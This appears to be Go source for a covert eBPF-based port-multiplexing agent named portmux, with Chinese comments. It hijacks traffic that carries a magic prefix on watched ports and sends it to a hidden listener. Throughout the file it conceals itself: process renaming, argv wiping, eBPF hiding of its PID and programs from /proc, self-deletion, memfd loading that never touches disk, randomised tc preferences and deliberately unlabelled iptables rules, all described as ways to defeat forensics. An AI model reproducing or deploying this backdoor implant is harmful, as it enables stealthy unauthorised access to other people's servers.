package agent

import (
	"context"
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/cilium/ebpf"
	"golang.org/x/sys/unix"

	"portmux/internal/bpf"
	"portmux/internal/handler"
	"portmux/internal/stealth"
)

const (
	ModeSkAssign = iota // 原生 eBPF 重定向 (bpf_sk_assign, 无 iptables)
	ModeLegacy          // mark + iptables DNAT (老内核回退)
)

const (
	markValue  = "0x706d0001/0x706d0001"
	markHex    = "0x706d0001"
	iptComment = "portmux"
	prefFile   = "/tmp/portmux-agent.pref"
	qdiscFlag  = "/tmp/portmux-agent.created_qdisc"
)

type Agent struct {
	cfg      *Config
	cfgMap   *ebpf.Map
	watchMap *ebpf.Map
	sockMap  *ebpf.Map
	stealth  *bpf.StealthObjects
	skLookup *bpf.SkLookupObjects

	agentIP     net.IP
	agentPort   uint16
	magicPrefix uint16
	listener    net.Listener
	listenFile  *os.File // 插入 sockmap 的监听 socket 副本
	router      *Router
	tcDone      func()
	tcPref      uint32
	mode        int
	createdQdisc bool
	savedSysctls map[string]string
	sem         chan struct{}
	cleanupOnce sync.Once
}

func New(cfg *Config) (*Agent, error) {
	a := &Agent{cfg: cfg}
	a.deriveMagic()
	a.setupAgentAddr()
	a.resolveIface()
	a.router = NewRouter(cfg)
	if cfg.Limits.MaxConns <= 0 {
		cfg.Limits.MaxConns = 256
	}
	a.sem = make(chan struct{}, cfg.Limits.MaxConns)
	return a, nil
}

func (a *Agent) deriveMagic() {
	h := sha256.Sum256([]byte(a.cfg.MagicKey))
	a.magicPrefix = binary.BigEndian.Uint16(h[:2])
}

func (a *Agent) setupAgentAddr() {
	a.agentIP = net.ParseIP("127.0.0.1")
	a.agentPort = 31337 + uint16(os.Getpid()%10000)
}

// resolveIface 空或 "auto" 时自动探测默认路由网卡
func (a *Agent) resolveIface() {
	iface := a.cfg.Listen.Iface
	if iface != "" && iface != "auto" {
		return
	}
	data, err := os.ReadFile("/proc/net/route")
	if err != nil {
		return
	}
	for _, line := range strings.Split(string(data), "\n") {
		fields := strings.Fields(line)
		if len(fields) >= 2 && fields[1] == "00000000" {
			a.cfg.Listen.Iface = fields[0]
			log.Printf("iface auto-detected: %s", fields[0])
			return
		}
	}
}

func (a *Agent) Start() error {
	if err := a.startListener(); err != nil {
		return fmt.Errorf("listener: %w", err)
	}
	if err := a.attachTC(); err != nil {
		return fmt.Errorf("attach tc: %w", err)
	}
	if err := a.configureBPF(); err != nil {
		return fmt.Errorf("configure bpf: %w", err)
	}
	if a.mode == ModeLegacy {
		if err := a.setupIptables(); err != nil {
			return fmt.Errorf("iptables: %w", err)
		}
	}
	a.setupStealth()
	return a.serve()
}

// setupStealth 进程伪装/参数抹除/进程隐藏 (均为可选, 失败不阻塞)
func (a *Agent) setupStealth() {
	log.Printf("stealth: begin")
	if a.cfg.Stealth.ProcessName != "" {
		stealth.HideProcess(a.cfg.Stealth.ProcessName)
	}
	log.Printf("stealth: comm set")
	if a.cfg.Stealth.WipeArgv {
		stealth.WipeArgs()
	}
	log.Printf("stealth: argv wiped")
	if a.cfg.Stealth.HideProc {
		// 带超时的宽容加载: 个别内核上 perf/tracepoint 挂载可能长时间阻塞,
		// 绝不因可选功能卡死主启动流程
		type stealthResult struct {
			s   *bpf.StealthObjects
			err error
		}
		ch := make(chan stealthResult, 1)
		go func() {
			s, err := bpf.LoadStealth()
			ch <- stealthResult{s, err}
		}()
		select {
		case r := <-ch:
			if r.err != nil {
				log.Printf("stealth: /proc 隐藏加载失败 (继续运行): %v", r.err)
			} else if r.s != nil {
				a.stealth = r.s
				r.s.HidePid(uint32(os.Getpid()))
				for _, id := range bpf.FindProgramIDs() {
					r.s.HideProg(uint32(id))
				}
				handler.SetPidHider(r.s.HidePid)
				log.Printf("stealth: /proc 隐藏已启用 (pid=%d)", os.Getpid())
			}
		case <-time.After(5 * time.Second):
			log.Printf("stealth: /proc 隐藏加载超时, 跳过 (后台可能稍后完成挂载)")
		}
	}
	if a.cfg.Stealth.SelfDelete {
		log.Printf("stealth: self-deleting")
		stealth.SelfDelete()
		log.Printf("stealth: self-delete done")
	}
}

func (a *Agent) startListener() error {
	addr := &net.TCPAddr{IP: a.agentIP, Port: int(a.agentPort)}
	var err error
	a.listener, err = net.ListenTCP("tcp", addr)
	if err != nil {
		for port := int(a.agentPort) + 1; port < int(a.agentPort)+100; port++ {
			addr.Port = port
			a.listener, err = net.ListenTCP("tcp", addr)
			if err == nil {
				a.agentPort = uint16(port)
				break
			}
		}
		if err != nil {
			return fmt.Errorf("failed to bind listener: %w", err)
		}
	}
	log.Printf("agent listening on %s:%d", a.agentIP, a.agentPort)
	return nil
}

// attachTC 用 memfd 把 BPF ELF 喂给 tc (不落盘), 优先 sk_assign 段, 老内核回退 legacy 段
func (a *Agent) attachTC() error {
	iface := a.cfg.Listen.Iface
	if iface == "" {
		return fmt.Errorf("无法确定网卡 (listen.iface 为空且自动探测失败)")
	}
	if err := exec.Command("ip", "link", "show", iface).Run(); err != nil {
		return fmt.Errorf("网卡 %s 不存在或不可用 (请修改 listen.iface), 当前网卡: %s", iface, listIfaces())
	}

	a.tcPref = choosePref(iface)
	os.WriteFile(prefFile, []byte(fmt.Sprintf("0x%x", a.tcPref)), 0644)

	a.createdQdisc = !qdiscExists(iface, "clsact")
	exec.Command("tc", "qdisc", "add", "dev", iface, "clsact").Run()

	if err := a.attachSection(bpf.SecMain); err == nil {
		a.mode = ModeSkAssign
		a.tcDone = func() { delFilter(iface, a.tcPref) }
		log.Printf("TC attached to %s (ingress, pref=0x%x, sk_assign 原生重定向)", iface, a.tcPref)
		return nil
	} else {
		log.Printf("sk_assign 段加载失败, 回退 legacy: %v", err)
	}
	if err := a.attachSection(bpf.SecLegacy); err != nil {
		return fmt.Errorf("tc filter add (两种模式均失败): %w", err)
	}
	a.mode = ModeLegacy
	a.tcDone = func() { delFilter(iface, a.tcPref) }
	log.Printf("TC attached to %s (ingress, pref=0x%x, legacy mark 模式)", iface, a.tcPref)
	return nil
}

// attachSection memfd 承载 ELF → tc filter add (obj /proc/self/fd/3), 全程不落盘
func (a *Agent) attachSection(sec string) error {
	iface := a.cfg.Listen.Iface
	delFilter(iface, a.tcPref)

	memf, path, err := memfdELF()
	if err != nil {
		return err
	}
	defer memf.Close()

	cmd := exec.Command("tc", "filter", "add", "dev", iface, "ingress",
		"pref", fmt.Sprintf("0x%x", a.tcPref), "bpf", "da",
		"obj", path, "sec", sec)
	cmd.ExtraFiles = []*os.File{memf}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("tc filter add (sec %s): %w: %s", sec, err, string(out))
	}
	return nil
}

func memfdELF() (*os.File, string, error) {
	name := fmt.Sprintf("pm%d", time.Now().UnixNano()%100000)
	fd, err := unix.MemfdCreate(name, 0)
	if err != nil {
		return nil, "", fmt.Errorf("memfd: %w", err)
	}
	f := os.NewFile(uintptr(fd), name)
	if _, err := f.Write(bpf.BPFELF); err != nil {
		f.Close()
		return nil, "", fmt.Errorf("memfd write: %w", err)
	}
	if _, err := f.Seek(0, 0); err != nil {
		f.Close()
		return nil, "", fmt.Errorf("memfd seek: %w", err)
	}
	return f, fmt.Sprintf("/proc/self/fd/%d", fd), nil
}

// choosePref 选择未占用的随机 filter preference (消除固定 pref 特征)
func choosePref(iface string) uint32 {
	used := map[uint32]bool{}
	if out, err := exec.Command("tc", "filter", "show", "dev", iface, "ingress").CombinedOutput(); err == nil {
		for _, line := range strings.Split(string(out), "\n") {
			if strings.Contains(line, "pref ") {
				fields := strings.Fields(line)
				for i, f := range fields {
					if f == "pref" && i+1 < len(fields) {
						if v, err := strconv.ParseUint(strings.TrimPrefix(fields[i+1], "0x"), 16, 32); err == nil {
							used[uint32(v)] = true
						}
					}
				}
			}
		}
	}
	for tries := 0; tries < 64; tries++ {
		var b [2]byte
		rand.Read(b[:])
		v := uint32(b[0])<<8 | uint32(b[1])
		if v < 0x1000 || v == 0x706d {
			continue
		}
		if !used[v] {
			return v
		}
	}
	return 0x706d // 极端情况下回退
}

func (a *Agent) configureBPF() error {
	// 优先 pinned map (确定性), 拿不到退回按名扫描 (兼容旧 tc)
	cfgMap, watchMap, sockMap, err := bpf.LoadPinnedMaps()
	if err != nil {
		for i := 0; i < 10; i++ {
			cfgMap, watchMap, sockMap, err = bpf.FindMaps()
			if err == nil {
				break
			}
			time.Sleep(200 * time.Millisecond)
		}
	}
	if err != nil || cfgMap == nil {
		return fmt.Errorf("could not find BPF maps: %w", err)
	}
	a.cfgMap = cfgMap
	a.watchMap = watchMap
	a.sockMap = sockMap

	if err := a.applyMapConfig(); err != nil {
		return err
	}

	// 注意顺序: 先挂 sk_lookup, 成功后才把监听 socket 插入 sockmap。
	// 若先插 sockmap 再挂 sk_lookup 失败, 监听 socket 已进入 sockmap
	// (sk_prot 被换成 tcp_bpf_prot), 部分定制内核上
	// 该 socket 的 Close 永远无法唤醒阻塞中的 accept4 → SIGTERM 关机死锁。
	// sk_lookup 原生转向默认关闭: 部分定制内核上程序能挂载但
	// 连接不投递, 且无法自检; legacy (mark+DNAT) 是经充分验证的路径。
	// 需要零 iptables 模式时在配置里显式开启 listen.native: true。
	if a.mode == ModeSkAssign && !a.cfg.Listen.Native {
		log.Printf("sk_lookup 原生转向未启用 (listen.native=false), 使用 legacy 模式")
		if err := a.switchToLegacy(); err != nil {
			return fmt.Errorf("切换 legacy 模式失败: %w", err)
		}
		return nil
	}
	if a.mode == ModeSkAssign {
		if err := a.attachSkLookup(); err != nil {
			log.Printf("sk_lookup 挂载失败, 切换到 legacy 模式: %v", err)
			if err2 := a.switchToLegacy(); err2 != nil {
				return fmt.Errorf("切换 legacy 模式失败: %w", err2)
			}
		} else if err := a.registerSockmap(); err != nil {
			log.Printf("sockmap 注册失败, 切换到 legacy 模式: %v", err)
			if err2 := a.switchToLegacy(); err2 != nil {
				return fmt.Errorf("切换 legacy 模式失败: %w", err2)
			}
		}
	}
	return nil
}

// attachSkLookup 挂载 sk_lookup 转向程序 (无 iptables 的原生重定向核心)
func (a *Agent) attachSkLookup() error {
	s, err := bpf.LoadSkLookup()
	if err != nil {
		return err
	}
	a.skLookup = s
	log.Printf("sk_lookup attached (netns 原生转向)")
	return nil
}

// registerSockmap 把监听 socket 插入 sockmap, bpf_sk_assign 依据它做原生重定向
func (a *Agent) registerSockmap() error {
	tl, ok := a.listener.(*net.TCPListener)
	if !ok {
		return fmt.Errorf("listener type assert")
	}
	f, err := tl.File()
	if err != nil {
		return fmt.Errorf("listener file: %w", err)
	}
	key := uint32(0)
	if err := a.sockMap.Update(&key, uint32(f.Fd()), ebpf.UpdateAny); err != nil {
		f.Close()
		return fmt.Errorf("sockmap insert: %w", err)
	}
	a.listenFile = f
	log.Printf("sockmap registered (listen fd=%d)", f.Fd())
	return nil
}

// switchToLegacy sockmap 不可用时回退 mark+iptables 模式
func (a *Agent) switchToLegacy() error {
	if a.tcDone != nil {
		a.tcDone()
	}
	if err := a.attachSection(bpf.SecLegacy); err != nil {
		return err
	}
	a.mode = ModeLegacy
	if a.listenFile != nil {
		// 先从 sockmap 移除 socket (释放 psock 引用), 再关 dup fd,
		// 避免 sockmap 内 socket 的关闭路径在定制内核上挂死
		if a.sockMap != nil {
			var zeroKey uint32
			a.sockMap.Delete(&zeroKey)
		}
		a.listenFile.Close()
		a.listenFile = nil
	}
	// 重新加载 map (新 filter 创建的新实例) 并重写配置, 否则 enabled=0 永不 mark
	a.closeMaps()
	for i := 0; i < 10; i++ {
		cfgMap, watchMap, sockMap, err := bpf.LoadPinnedMaps()
		if err == nil {
			a.cfgMap, a.watchMap, a.sockMap = cfgMap, watchMap, sockMap
			break
		}
		time.Sleep(200 * time.Millisecond)
	}
	if a.cfgMap == nil {
		return fmt.Errorf("legacy 模式重新加载 map 失败")
	}
	if err := a.applyMapConfig(); err != nil {
		return err
	}
	if err := a.setupIptables(); err != nil {
		return err
	}
	log.Printf("已切换到 legacy 模式 (mark + iptables DNAT)")
	return nil
}

// applyMapConfig 把运行时配置写入 cfg/watch map (任何模式切换后都可重放)
func (a *Agent) applyMapConfig() error {
	if len(a.cfg.Listen.WatchPorts) > 8 {
		return fmt.Errorf("watch_ports 最多支持 8 个端口 (BPF map 上限), 当前配置了 %d 个", len(a.cfg.Listen.WatchPorts))
	}
	key := uint32(0)
	cfg := struct {
		AgentIP     uint32
		AgentPort   uint16
		MagicPrefix uint16
		Enabled     uint8
		Pad         [3]uint8
	}{
		AgentIP:     binary.LittleEndian.Uint32(a.agentIP.To4()),
		AgentPort:   uint16(a.agentPort),
		MagicPrefix: a.magicPrefix,
		Enabled:     1,
	}
	if err := a.cfgMap.Update(&key, &cfg, ebpf.UpdateAny); err != nil {
		return err
	}
	for i, port := range a.cfg.Listen.WatchPorts {
		key := uint32(i)
		val := uint16(port)
		if err := a.watchMap.Update(&key, &val, ebpf.UpdateAny); err != nil {
			return err
		}
	}
	return nil
}

// closeMaps 关闭当前 map 句柄
func (a *Agent) closeMaps() {
	if a.cfgMap != nil {
		a.cfgMap.Close()
		a.cfgMap = nil
	}
	if a.watchMap != nil {
		a.watchMap.Close()
		a.watchMap = nil
	}
	if a.sockMap != nil {
		a.sockMap.Close()
		a.sockMap = nil
	}
}

// ---------- legacy 模式: iptables DNAT + route_localnet ----------

func (a *Agent) setupIptables() error {
	a.removeIptablesRules()
	if err := a.enableLocalnetRoute(); err != nil {
		return err
	}
	for _, port := range a.cfg.Listen.WatchPorts {
		toAddr := fmt.Sprintf("127.0.0.1:%d", a.agentPort)
		// 注意: 不带 --comment 标签 (标签本身就是取证特征)
		cmd := exec.Command("iptables", "-t", "nat", "-I", "PREROUTING", "1",
			"-p", "tcp", "--dport", fmt.Sprintf("%d", port),
			"-m", "mark", "--mark", markValue,
			"-j", "DNAT", "--to-destination", toAddr)
		out, err := cmd.CombinedOutput()
		if err != nil {
			return fmt.Errorf("iptables rule: %w: %s", err, string(out))
		}
		log.Printf("iptables DNAT tcp/%d mark=%s → %s", port, markValue, toAddr)
	}
	return nil
}

func (a *Agent) enableLocalnetRoute() error {
	paths := []string{"/proc/sys/net/ipv4/conf/all/route_localnet",
		"/proc/sys/net/ipv4/conf/" + a.cfg.Listen.Iface + "/route_localnet"}
	if a.savedSysctls == nil {
		a.savedSysctls = map[string]string{}
	}
	for _, p := range paths {
		// 幂等: setupIptables 可能被调用两次 (switchToLegacy + Start),
		// 第二次读取到的是已被改写的 1, 绝不能用它覆盖原始快照
		if _, saved := a.savedSysctls[p]; saved {
			continue
		}
		old, err := os.ReadFile(p)
		if err != nil {
			continue
		}
		a.savedSysctls[p] = strings.TrimSpace(string(old))
		if err := os.WriteFile(p, []byte("1"), 0644); err != nil {
			return fmt.Errorf("设置 %s: %w", p, err)
		}
	}
	return nil
}

func (a *Agent) restoreSysctls() {
	for p, old := range a.savedSysctls {
		os.WriteFile(p, []byte(old), 0644)
	}
	a.savedSysctls = nil
}

func (a *Agent) removeIptablesRules() {
	out, err := exec.Command("iptables", "-t", "nat", "-S", "PREROUTING").CombinedOutput()
	if err != nil {
		return
	}
	for _, line := range strings.Split(string(out), "\n") {
		line = strings.TrimSpace(line)
		if !strings.HasPrefix(line, "-A") {
			continue
		}
		hasComment := strings.Contains(line, iptComment)
		hasMark := strings.Contains(line, "--mark") && strings.Contains(line, markHex)
		isNatJump := strings.Contains(line, "REDIRECT") || strings.Contains(line, "DNAT")
		if (!hasComment && !hasMark) || !isNatJump {
			continue
		}
		del := strings.Replace(line, "-A", "-D", 1)
		args := strings.Fields(del)
		if len(args) < 2 {
			continue
		}
		exec.Command("iptables", append([]string{"-t", "nat"}, args...)...).Run()
	}
}

func listIfaces() string {
	out, err := exec.Command("ip", "-br", "link").CombinedOutput()
	if err != nil {
		return "(unknown)"
	}
	return strings.TrimSpace(string(out))
}

func qdiscExists(iface, kind string) bool {
	out, err := exec.Command("tc", "qdisc", "show", "dev", iface).CombinedOutput()
	return err == nil && strings.Contains(string(out), kind)
}

func delFilter(iface string, pref uint32) {
	exec.Command("tc", "filter", "del", "dev", iface, "ingress",
		"pref", fmt.Sprintf("0x%x", pref)).Run()
}

// ---------- serve ----------

func (a *Agent) serve() error {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigCh
		log.Println("shutting down...")
		cancel()
		// 直接清理并退出, 不依赖 a.listener.Close() 唤醒 accept4:
		// 监听 socket 在 sockmap 内时, 部分定制内核上 Close 无法唤醒
		// 阻塞中的 accept 且自身挂死, 等待会导致关机死锁
		a.Cleanup()
		os.Exit(0)
	}()

	for {
		conn, err := a.listener.Accept()
		if err != nil {
			select {
			case <-ctx.Done():
				return nil
			default:
				if strings.Contains(err.Error(), "closed") {
					return nil
				}
				continue
			}
		}
		select {
		case a.sem <- struct{}{}:
		default:
			log.Printf("router: 并发连接超上限 (%d), 拒绝新连接", cap(a.sem))
			conn.Close()
			continue
		}
		go func(c net.Conn) {
			defer func() { <-a.sem }()
			a.router.Route(ctx, c)
		}(conn)
	}
}

// ---------- cleanup ----------

func (a *Agent) Cleanup() {
	// 幂等: 信号路径与正常退出路径可能并发调用
	a.cleanupOnce.Do(func() {
		createdQdisc := a.createdQdisc
		a.cleanupAgent()
		bpf.UnpinMaps()
		os.Remove(prefFile)
		// qdiscFlag 只在自己创建了 clsact 时移除; 若由 server.sh 创建,
		// 保留标记让 server.sh cleanup 负责删除 qdisc
		if createdQdisc {
			os.Remove(qdiscFlag)
		}
		os.Remove("/tmp/portmux.bpf.o") // 兼容旧版本残留
		a.removeIptablesRules()
		a.restoreSysctls()
	})
}

func (a *Agent) cleanupAgent() {
	if a.tcDone != nil {
		a.tcDone()
		a.tcDone = nil
	}
	if a.createdQdisc {
		exec.Command("tc", "qdisc", "del", "dev", a.cfg.Listen.Iface, "clsact").Run()
		a.createdQdisc = false
	}
	if a.listenFile != nil {
		a.listenFile.Close()
		a.listenFile = nil
	}
	// 注意: 这里不关闭 a.listener —— 进程退出时内核自动释放。
	// 监听 socket 若在 sockmap 中, 部分定制内核上 Close 无法唤醒
	// 阻塞中的 accept4 且自身挂死 (见 configureBPF 注释)。
	if a.stealth != nil {
		a.stealth.Close()
		a.stealth = nil
	}
	if a.skLookup != nil {
		a.skLookup.Close()
		a.skLookup = nil
	}
	a.closeMaps()
}
